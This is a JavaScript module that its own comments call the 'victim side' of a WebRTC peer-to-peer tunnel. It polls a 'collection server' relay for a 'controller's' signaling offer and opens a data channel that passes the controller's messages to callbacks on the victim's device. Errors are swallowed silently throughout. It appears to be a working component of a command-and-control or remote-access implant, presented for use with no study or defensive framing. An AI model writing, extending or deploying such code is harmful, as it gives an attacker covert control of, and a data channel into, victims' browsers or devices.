/**
 * WebRTC P2P Tunnel — victim side.
 *
 * initWebRTCTunnel(relayBase, deviceToken, onOpen, onMessage, onClose)
 *   relayBase   – HTTPS collection server URL (no trailing slash)
 *   deviceToken – signaling session token (matches the controller's token)
 *   onOpen(ch)  – called when DataChannel opens; ch is the RTCDataChannel
 *   onMessage(parsedObj, ch) – called for each DataChannel message
 *   onClose()   – called when channel closes
 *
 * Returns the RTCPeerConnection instance.
 */

export async function initWebRTCTunnel(relayBase, deviceToken, onOpen, onMessage, onClose) {
  const pc = new RTCPeerConnection({
    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
  });

  // POST ICE candidates generated locally (victim role)
  pc.onicecandidate = (e) => {
    if (e.candidate) {
      fetch(`${relayBase}/api/webrtc/ice/${deviceToken}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ role: 'victim', candidate: e.candidate }),
      }).catch(() => {});
    }
  };

  // When the controller opens a DataChannel we receive it here
  pc.ondatachannel = (e) => {
    const ch = e.channel;
    ch.onopen  = () => onOpen(ch);
    ch.onmessage = (ev) => {
      try {
        onMessage(JSON.parse(ev.data), ch);
      } catch {}
    };
    ch.onclose = () => onClose();
  };

  // Poll for the controller's offer (up to 2 min, every 2s)
  async function pollOffer() {
    for (let i = 0; i < 60; i++) {
      let r = null;
      try {
        r = await fetch(`${relayBase}/api/webrtc/offer/${deviceToken}`).then((res) => res.json());
      } catch {}
      if (r?.ready && r.offer) {
        await pc.setRemoteDescription(new RTCSessionDescription(r.offer));
        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);
        // POST answer back to signaling relay
        await fetch(`${relayBase}/api/webrtc/answer/${deviceToken}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sdp: answer.sdp, type: answer.type }),
        }).catch(() => {});
        // Start polling controller ICE candidates
        pollIce();
        return;
      }
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }
  }

  // Poll for controller's ICE candidates and add them incrementally
  let iceSince = 0;
  async function pollIce() {
    while (true) {
      let r = null;
      try {
        r = await fetch(
          `${relayBase}/api/webrtc/ice/${deviceToken}?role=victim&since=${iceSince}`
        ).then((res) => res.json());
      } catch {}
      if (r?.candidates?.length) {
        for (const c of r.candidates) {
          try {
            await pc.addIceCandidate(new RTCIceCandidate(c));
          } catch {}
          iceSince++;
        }
      }
      const state = pc.connectionState;
      if (state === 'connected' || state === 'closed' || state === 'failed') break;
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
  }

  pollOffer();
  return pc;
}
